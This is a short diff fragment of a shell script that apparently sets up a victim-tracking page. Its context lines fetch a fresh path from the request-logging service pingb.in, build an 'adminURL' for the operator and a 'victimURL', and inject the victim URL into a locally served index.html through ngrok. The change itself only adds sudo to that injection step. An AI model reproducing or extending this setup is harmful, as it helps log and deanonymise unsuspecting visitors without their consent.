@@ -17,6 +17,6 @@ sed -i 's/tcp:/http:/g' ngrokURL
 pingb=$(curl pingb.in 2>&1 | cut -d "\"" -f 2 | xargs | sed "s/.*\//\//g" | xargs -I{} echo {})
 url="http://pingb.in$pingb"
 victimURL="http://pingb.in/p$pingb"
-sed -i "s#REPLACE_ME#${victimURL}#g" /var/www/html/index.html
+sudo sed -i "s#REPLACE_ME#${victimURL}#g" /var/www/html/index.html
 echo ${url} > adminURL
 echo $victimURL > victimURL
